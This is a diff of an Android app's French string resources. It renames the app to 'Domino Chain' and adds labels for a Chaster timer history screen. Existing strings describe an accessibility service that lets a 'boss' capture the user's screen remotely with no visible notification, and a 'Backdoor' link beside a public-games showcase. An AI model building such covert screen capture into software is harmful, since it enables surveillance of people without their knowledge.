@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <resources>
-    <string name="app_name">Bg</string>
+    <string name="app_name">Domino Chain</string>
     <string name="accessibility_service_description">Permet au boss de capturer votre écran à distance, sans notification visible.</string>
     <string name="battery_optimization_link">Désactiver l\'optimisation batterie pour cette app</string>
     <string name="settings">Paramètres</string>
@@ -53,6 +53,13 @@
     <string name="tracker_quick_add">+1 clope</string>
     <string name="tracker_widget_increment_description">Ajouter une cigarette</string>
     <string name="refresh">Actualiser</string>
+    <string name="chaster_open_history">Voir les modifications du timer</string>
+    <string name="chaster_history_title">Historique Chaster</string>
+    <string name="chaster_history_subtitle">Modifications appliquées au timer Chaster, de la plus récente à la plus ancienne.</string>
+    <string name="chaster_history_default_summary">Modification du timer</string>
+    <string name="chaster_history_empty">Aucune modification Chaster enregistrée pour le moment.</string>
+    <string name="chaster_history_end">Fin de l\'historique.</string>
+    <string name="chaster_history_load_error">Impossible de charger l\'historique Chaster.</string>
     <string name="main_link_vitrine">Vitrine</string>
     <string name="main_link_backdoor">Backdoor</string>
     <string name="showcase_control_title">Vitrine (jeux publics)</string>
@@ -79,7 +86,7 @@
     <string name="update_available_title">Mise à jour disponible</string>
     <string name="update_available_message">Une nouvelle version de l\'application est disponible.</string>
     <string name="update_download">Télécharger</string>
-    <string name="update_download_title">Mise à jour Bg</string>
+    <string name="update_download_title">Mise à jour Domino Chain</string>
     <string name="update_download_description">Téléchargement de la nouvelle version</string>
     <string name="update_download_started">Téléchargement de la mise à jour lancé</string>
     <string name="update_download_failed">Le téléchargement de la mise à jour a échoué</string>
